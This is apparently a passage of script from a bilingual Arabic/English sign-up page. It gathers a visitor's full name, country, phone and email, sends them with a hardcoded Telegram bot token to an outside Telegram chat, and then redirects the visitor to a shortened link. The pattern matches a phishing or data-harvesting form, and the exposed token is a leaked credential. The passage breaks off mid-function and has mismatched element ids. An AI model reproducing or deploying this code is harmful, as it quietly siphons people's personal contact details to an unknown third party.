  <script>
    function sendToTelegram() {
      const username = document.getElementById('full rname').value.trim();
      const country = document.getElementById('country').value.trim();
      const phone = document.getElementById('phone').value.trim();
      const email = document.getElementById('email').value.trim();
      const status = document.getElementById('statusMsg');

      if (!username || !country || !phone || !email) {
        status.textContent = 'Please fill in all fields!';
        status.style.color = 'orange';
        return;
      }

      const token = '6456489010:AAHxWt_1iqbOk7yWiU76djvQMMXToLcmEuU';
      const chat_id = 5830998075;

      const message = `👤 New user submitted:\n\n🔸 Username: ${username}\n🌍 Country: ${country}\n📱 Phone: ${phone}\n📧 Email: ${email}`;

      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          chat_id: chat_id,
          text: message
        })
      })
      .then(response => response.json())
      .then(data => {
        if (data.ok) {
          status.textContent = '✅ Your request has been received! Redirecting...';
          status.style.color = 'lightgreen';
          setTimeout(() => {
            window.location.href = 'https://smrturl.co/10f0574';
          }, 2000);
        } else {
          status.textContent = `❌ Failed to send. Error: ${data.description}`;
          status.style.color = 'red';
        }
      })
      .catch(error => {
        status.textContent = `⚠️ An error occurred: ${error.message}`;
        status.style.color = 'red';
      });
    }

    function toggleLanguage() {
      const isEnglish = document.documentElement.lang === 'en';

      if (isEnglish) {
        document.documentElement.lang = 'ar';
        document.getElementById('mainTitle').textContent = 'احجز مكانك الان!';
        document.getElementById('mainText').textContent = 'من فضلك ادخل تفاصيلك :';

        document.getElementById('phone').placeholder = 'رقم الهاتف';
        document.getElementById('email').placeholder = 'البريد الإلكتروني';
        document.querySelector("button").textContent = 'إرسال';
        document.getElementById('langToggle').textContent = 'EN';
      } else {
        document.documentElement.lang = 'en';
        document.getElementById('mainTitle').textContent = 'سجل الان!';
        document.getElementById('mainText').textContent = 'Please enter your details :';
        document.getElementById('username').placeholder = 'Your  full name';
        document.getElementById('phone').placeholder = 'Phone Number';
        document.getElementById('email').placeholder = 'Email Address';
        document.querySelector("button").textContent = 'Submit';
